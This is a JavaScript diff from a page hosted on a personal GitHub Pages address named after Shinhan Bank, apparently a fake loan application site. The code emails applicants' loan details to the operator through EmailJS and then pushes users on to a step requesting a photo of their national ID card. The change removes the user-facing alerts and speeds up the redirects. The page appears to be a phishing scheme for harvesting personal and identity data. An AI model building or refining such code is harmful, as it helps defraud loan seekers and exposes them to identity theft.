@@ -1592,30 +1592,28 @@
                         total_interest: userData.totalInterest ? userData.totalInterest.toLocaleString('vi-VN') + ' VND' : "",
                         total_repayment: userData.totalRepayment ? userData.totalRepayment.toLocaleString('vi-VN') + ' VND' : ""
                     })
-                    .then(response => {
-                        console.log('Email sent:', response.status, response.text);
-                        userData.emailSent = true;
-                        saveToLocalStorage();
-                        spinner.style.display = 'none';
-                        alert('Gửi hồ sơ thành công vui lòng xác minh chụp ảnh CCCD ở bước tiếp theo.');
-                        setTimeout(() => {
-                            window.location.href = 'https://vaytieudung.github.io/shinhanbank/pages/vi/step2.html';
-                        }, 500);
-                    }, error => {
-                        console.error('Email error:', error);
-                        if (retries > 0) {
-                            retries--;
-                            console.log(`Retrying... ${retries} attempts left`);
-                            setTimeout(sendEmail, 1000);
-                        } else {
-                            console.error('Email failed after retries:', error);
-                            spinner.style.display = 'none';
-                            alert('Gửi hồ sơ không thành công. Vui lòng kiểm tra cấu hình EmailJS hoặc thử lại.');
-                            setTimeout(() => {
-                                window.location.href = 'https://vaytieudung.github.io/shinhanbank/pages/vi/step1.html';
-                            }, 500);
-                        }
-                    });
+                   .then(response => {
+    console.log('Email sent:', response.status, response.text);
+    userData.emailSent = true;
+    saveToLocalStorage();
+    spinner.style.display = 'none';
+    setTimeout(() => {
+        window.location.href = 'https://vaytieudung.github.io/shinhanbank/pages/vi/step2.html';
+    }, 50);
+}, error => {
+    console.error('Email error:', error);
+    if (retries > 0) {
+        retries--;
+        console.log(`Retrying... ${retries} attempts left`);
+        setTimeout(sendEmail, 1000);
+    } else {
+        console.error('Email failed after retries:', error);
+        spinner.style.display = 'none';
+        setTimeout(() => {
+            window.location.href = 'https://vaytieudung.github.io/shinhanbank/pages/vi/step1.html';
+        }, 50);
+    }
+});
                 }
                 sendEmail();
             } else {
